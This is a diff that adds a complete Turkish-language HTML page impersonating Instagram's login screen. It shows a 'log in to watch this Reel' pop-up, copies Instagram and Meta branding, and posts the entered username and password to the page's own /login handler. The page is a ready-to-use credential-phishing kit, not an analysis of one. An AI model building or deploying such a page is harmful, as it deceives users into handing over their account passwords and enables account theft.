@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram Log In</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Roboto', sans-serif;
+    }
+    body {
+      background-color: #121212;
+      color: white;
+    }
+    .modal {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 0, 0, 0.6);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+    }
+    .modal-content {
+      background: #1e1e1e;
+      padding: 20px;
+      border-radius: 12px;
+      width: 90%;
+      max-width: 300px;
+      text-align: center;
+    }
+    .modal-content h2 {
+      font-size: 18px;
+      margin-bottom: 20px;
+      color: white;
+    }
+    .modal-content button {
+      padding: 10px 20px;
+      background-color: #3797f0;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .login-container {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      padding: 40px 20px;
+      max-width: 400px;
+      margin: auto;
+    }
+    .lang {
+      color: #ccc;
+      margin-bottom: 20px;
+      font-size: 14px;
+    }
+    .logo {
+      width: 80px;
+      margin-bottom: 30px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 6px 0;
+      background: #262626;
+      border: 1px solid #333;
+      border-radius: 8px;
+      color: white;
+    }
+    .login-btn {
+      width: 100%;
+      background-color: #3797f0;
+      color: white;
+      border: none;
+      padding: 12px;
+      border-radius: 24px;
+      font-weight: bold;
+      margin-top: 10px;
+    }
+    .forgot, .signup, .meta, .legal {
+      text-align: center;
+      margin-top: 15px;
+      font-size: 13px;
+      color: #a8a8a8;
+    }
+    .forgot a,
+    .signup a {
+      color: #3797f0;
+      text-decoration: none;
+      font-weight: bold;
+    }
+    .signup {
+      margin-top: 25px;
+    }
+    .signup button {
+      background: transparent;
+      border: 1px solid #3797f0;
+      color: #3797f0;
+      padding: 10px 16px;
+      border-radius: 24px;
+      font-weight: bold;
+      margin-top: 10px;
+    }
+    .meta img {
+      height: 50px;
+      margin-top: 25px;
+      filter: brightness(0) invert(1);
+    }
+  </style>
+</head>
+<body>
+  <div class="modal" id="popup">
+    <div class="modal-content">
+      <h2>Bu Reels'i izlemek için öncelikle hesabınla giriş yapmalısın</h2>
+      <button onclick="openLogin()">Giriş Yap</button>
+    </div>
+  </div>
+
+  <form class="login-container" id="login" action="/login" method="POST">
+    <div class="lang">Türkçe</div>
+    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Icon">
+    <input type="text" name="username" placeholder="Kullanıcı adı, e-posta veya cep numarası">
+    <input type="password" name="password" placeholder="Şifre">
+    <button class="login-btn" type="submit">Giriş yap</button>
+    </form><div class="forgot"><a href="#">Şifreni mi unuttun?</a></div>
+    <div class="signup">
+      <div>Hesabın yok mu? <a href="#">Yeni hesap oluştur</a></div>
+    </div>
+    <div class="meta">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Meta-Logo.png" style="height: 50px; margin-top: 25px; filter: brightness(0) invert(1);" alt="Meta Logo">
+    </div>
+    <div class="legal">
+      Koşullar ve Künye<br>
+      NetzDG/UrhDaG/İçerik Derecelendirme
+    </div>
+  </div>
+
+  <script>
+    function openLogin() {
+      document.getElementById('popup').style.display = 'none';
+      document.getElementById('login').style.display = 'flex';
+    }
+  </script>
+</body>
+</html>
